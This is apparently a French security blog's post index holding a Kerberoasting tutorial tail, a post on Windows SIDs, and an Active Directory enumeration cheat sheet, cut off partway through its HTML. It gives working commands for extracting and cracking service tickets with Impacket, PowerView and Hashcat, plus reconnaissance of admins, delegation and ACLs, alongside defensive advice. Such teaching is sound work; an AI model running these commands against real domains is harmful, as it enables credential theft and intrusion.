Hashcat hashcat -m 13100 -a 0 hash.txt wordlist.txt 🐍 Kerberoasting avec Impacket (GetUserSPNs.py) Lister les comptes SPN :\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Extraire le TGS chiffré :\nsudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request ⚡ Kerberoasting avec PowerView Importer PowerView :\nImport-Module .\\PowerView.ps1 Lister les utilisateurs avec SPN :\nGet-DomainUser * -SPN | select samaccountname Extraire un TGS au format Hashcat :\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Exporter tous les tickets vers un fichier CSV:\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tickets.csv -NoTypeInformation 🧭 Contextes d’exécution possibles Une attaque Kerberoasting peut être lancée à partir de différents environnements :\n💻 Windows joint au domaine, avec un shell utilisateur ou SYSTEM 🐧 Linux joint ou non au domaine, avec keytab ou identifiants 🔐 Shell distant avec runas /netonly sur Windows 🧪 Via un accès VPN ou une session RDP, avec des outils de pentest 🛡️ Détection \u0026amp; défense Pour se défendre contre Kerberoasting, voici quelques bonnes pratiques :\nUtiliser des mots de passe robustes et complexes pour les comptes de service Éviter les comptes de service à privilèges élevés (comme Domain Admin) Implémenter Managed Service Accounts (MSA/gMSA) Surveiller les requêtes TGS en masse Déployer des solutions de détection comportementale (EDR, SIEM, etc.) Restreindre les permissions des utilisateurs standards 📚 Références utiles Rubeus GitHub Impacket Tools PowerView Kerberoasting Technique (MITRE ATT\u0026amp;CK) ","permalink":"https://nyobemichel.me/posts/kerberoasting/","summary":"Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. Décryptons ensemble la méthode, les outils et les moyens de défense.","title":"Kerberoasting : Attaque d'Active Directory via Kerberos"},{"content":"Comprendre les Identificateurs de Sécurité (SID) dans Active Directory Un identificateur de sécurité (SID) est utilisé pour identifier de manière unique un principal de sécurité ou un groupe de sécurité dans un environnement Windows. Ces identifiants jouent un rôle fondamental dans la gestion des autorisations et l\u0026rsquo;authentification au sein d’un domaine Active Directory.\n1. Qu’est-ce qu’un principal de sécurité ? Un principal de sécurité est toute entité pouvant être authentifiée par le système d’exploitation. Il peut s’agir :\nd’un compte d’utilisateur,\nd’un compte d’ordinateur,\nou d’un thread ou processus exécuté dans le contexte de sécurité d’un compte existant.\nChaque fois qu’un utilisateur se connecte, le système génère un jeton d’accès contenant :\nle SID de l’utilisateur,\nles droits de l’utilisateur,\net les SID des groupes auxquels l’utilisateur appartient.\nCe jeton d’accès définit le contexte de sécurité utilisé par l’utilisateur pour interagir avec le système.\n2. Architecture d’un SID Un SID est une structure de données binaire contenant un nombre variable de valeurs. Les premières valeurs décrivent la structure du SID, tandis que les suivantes identifient l’autorité, le domaine et l’objet.\nUne fois converti au format lisible, un SID suit généralement cette notation standard :\nCopierModifier\nS-R-X-Y1-Y2-Yn-1-Yn\nExemple : Le SID du groupe intégré Administrateurs est représenté comme suit :\nCopierModifier\nS-1-5-32-544\nDécomposons ce SID :\nS : identifie qu’il s’agit d’un SID.\n1 : niveau de révision.\n5 : autorité d’identification (Autorité NT).\n32 : identifiant du domaine (Builtin).\n544 : identifiant relatif (RID) pour le groupe « Administrateurs ».\n3. SID connus Certains SID sont pré-définis et restent constants, quel que soit l’environnement ou le système. Ces SID connus sont générés automatiquement lors de l’installation du système d’exploitation ou de la création du domaine. Ils sont utilisés pour identifier :\ndes groupes génériques (Administrateurs, Utilisateurs, etc.),\nou des comptes système standards.\nPar exemple :\nS-1-5-18 : représente le compte SYSTEM.\nS-1-5-19 : correspond au Service local.\nS-1-5-32-544 : désigne le groupe Administrateurs.\nRéférences Comprendre les identificateurs de sécurité - Microsoft Docs ","permalink":"https://nyobemichel.me/posts/sid--identificateurs-de-s%C3%A9curit%C3%A9-/","summary":"Un identificateur de sécurité (SID) est essentiel dans la gestion des accès et de la sécurité dans les systèmes Windows. Découvrez comment il fonctionne, son rôle dans l\u0026rsquo;authentification et sa structure binaire.","title":"SID ( Identificateurs de sécurité )"},{"content":"📁 1. Domaine et Forêts 🔍 Obtenir le domaine actuel Get-Domain # PowerView Get-ADDomain # Module ActiveDirectory 🌐 Interroger un autre domaine Get-Domain -Domain example.local Get-ADDomain -Identity example.local 🆔 Récupérer le SID du domaine Get-DomainSID (Get-ADDomain).DomainSID 🖥️ Récupérer les contrôleurs de domaine Get-DomainController Get-ADDomainController 🤝 Obtenir les relations d’approbation (trusts) Get-DomainTrust Get-ADTrust 🌲 Informations sur la forêt Get-Forest Get-ADForest 📜 Lister tous les domaines d’une forêt Get-ForestDomain (Get-ADForest).Domains 🗺️ Cartographier les fiducies d\u0026rsquo;une forêt Get-ForestTrust Get-ADTrust -Filter \u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39; 👤 2. Utilisateurs 👥 Liste des utilisateurs Get-DomainUser Get-ADUser -Filter * -Properties * 🔍 Détails d’un utilisateur spécifique Get-DomainUser -Identity user1 -Properties * Get-ADUser -Identity user1 -Properties * 🔄 Propriétés utiles Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name 👑 Membres du groupe « Enterprise Admins » Get-DomainGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recurse 🖥️ Groupes locaux d\u0026rsquo;une machine (privilèges requis) Get-NetLocalGroup -ComputerName dcorp-dc Get-NetLocalGroup -ComputerName dcorp-dc -GroupName Administrators 🔎 Recherche d’accès administrateur local Find-LocalAdminAccess -Verbose 🔐 Comptes dont le mot de passe n’expire jamais Get-ADUser -Filter {PasswordNeverExpires -eq $true} 🎭 Comptes avec délégation Kerberos activée Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} 🧾 Droits de l\u0026rsquo;utilisateur actuel whoami /priv 👪 3. Groupes 📋 Lister les groupes Get-DomainGroup Get-ADGroup -Filter * -Properties * 🔍 Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo; Get-DomainGroup *admin* Get-ADGroup -Filter \u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39; 👑 Membres « Domain Admins » Get-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recurse 🖥️ 4. Machines \u0026amp; Serveurs 📜 Liste des ordinateurs Get-DomainComputer Get-ADComputer -Filter * -Properties * 🔍 Recherche spécifique (ex. Server 2022) Get-DomainComputer -OperatingSystem \u0026#34;*Server 2022*\u0026#34; 📡 Test de connectivité Get-ADComputer -Filter * -Properties DNSHostName | % { Test-Connection -Count 1 -ComputerName $_.DNSHostName } 👁️ Localisation des sessions d’un utilisateur Find-DomainUserLocation -UserGroupIdentity \u0026#34;RDPUsers\u0026#34; 🔐 5. ACL et Permissions 🔍 Obtenir les ACL d’un objet Get-DomainObjectAcl -SamAccountName user1 -ResolveGUIDs 🧠 Rechercher des ACE intéressants Find-InterestingDomainAcl -ResolveGUIDs 📂 ACL sur un chemin spécifique Get-PathAcl -Path \u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34; 📂 6. Autres Techniques 📂 Découverte de serveurs de fichiers Get-NetFileServer 📚 Ressources utiles PowerView Documentation (PowerSploit) Cmdlets Active Directory Microsoft ","permalink":"https://nyobemichel.me/posts/enumeration-active-directory/","summary":"\u003ch2 id=\"-1-domaine-et-forêts\"\u003e📁 1. Domaine et Forêts\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-le-domaine-actuel\"\u003e🔍 Obtenir le domaine actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e                \u003cspan class=\"c\"\u003e# PowerView\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e              \u003cspan class=\"c\"\u003e# Module ActiveDirectory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-interroger-un-autre-domaine\"\u003e🌐 Interroger un autre domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003eexample\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-récupérer-le-sid-du-domaine\"\u003e🆔 Récupérer le SID du domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomainSID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-récupérer-les-contrôleurs-de-domaine\"\u003e🖥️ Récupérer les contrôleurs de domaine\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADDomainController\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-obtenir-les-relations-dapprobation-trusts\"\u003e🤝 Obtenir les relations d’approbation (trusts)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-informations-sur-la-forêt\"\u003e🌲 Informations sur la forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-Forest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-lister-tous-les-domaines-dune-forêt\"\u003e📜 Lister tous les domaines d’une forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestDomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eGet-ADForest\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eDomains\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-cartographier-les-fiducies-dune-forêt\"\u003e🗺️ Cartographier les fiducies d\u0026rsquo;une forêt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ForestTrust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADTrust\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ms-DS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-utilisateurs\"\u003e👤 2. Utilisateurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-utilisateurs\"\u003e👥 Liste des utilisateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-détails-dun-utilisateur-spécifique\"\u003e🔍 Détails d’un utilisateur spécifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-propriétés-utiles\"\u003e🔄 Propriétés utiles\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003e-First\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Member\u003c/span\u003e \u003cspan class=\"n\"\u003e-MemberType\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eProperty\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres-du-groupe--enterprise-admins-\"\u003e👑 Membres du groupe « Enterprise Admins »\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enterprise Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-groupes-locaux-dune-machine-privilèges-requis\"\u003e🖥️ Groupes locaux d\u0026rsquo;une machine (privilèges requis)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nb\"\u003edcorp-dc\u003c/span\u003e \u003cspan class=\"n\"\u003e-GroupName\u003c/span\u003e \u003cspan class=\"n\"\u003eAdministrators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-daccès-administrateur-local\"\u003e🔎 Recherche d’accès administrateur local\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-LocalAdminAccess\u003c/span\u003e \u003cspan class=\"n\"\u003e-Verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-dont-le-mot-de-passe-nexpire-jamais\"\u003e🔐 Comptes dont le mot de passe n’expire jamais\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ePasswordNeverExpires\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-comptes-avec-délégation-kerberos-activée\"\u003e🎭 Comptes avec délégation Kerberos activée\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eTrustedForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"n\"\u003eTrustedToAuthForDelegation\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-droits-de-lutilisateur-actuel\"\u003e🧾 Droits de l\u0026rsquo;utilisateur actuel\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhoami\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003epriv\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-groupes\"\u003e👪 3. Groupes\u003c/h2\u003e\n\u003ch3 id=\"-lister-les-groupes\"\u003e📋 Lister les groupes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-groupes-contenant-admin\"\u003e🔍 Rechercher des groupes contenant \u0026ldquo;admin\u0026rdquo;\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroup\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-membres--domain-admins-\"\u003e👑 Membres « Domain Admins »\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"n\"\u003e-Identity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Domain Admins\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-Recurse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-4-machines--serveurs\"\u003e🖥️ 4. Machines \u0026amp; Serveurs\u003c/h2\u003e\n\u003ch3 id=\"-liste-des-ordinateurs\"\u003e📜 Liste des ordinateurs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-recherche-spécifique-ex-server-2022\"\u003e🔍 Recherche spécifique (ex. Server 2022)\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-OperatingSystem\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;*Server 2022*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-test-de-connectivité\"\u003e📡 Test de connectivité\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Filter\u003c/span\u003e \u003cspan class=\"p\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"n\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e%\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nb\"\u003eTest-Connection\u003c/span\u003e \u003cspan class=\"n\"\u003e-Count\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ComputerName\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDNSHostName\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-localisation-des-sessions-dun-utilisateur\"\u003e👁️ Localisation des sessions d’un utilisateur\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre 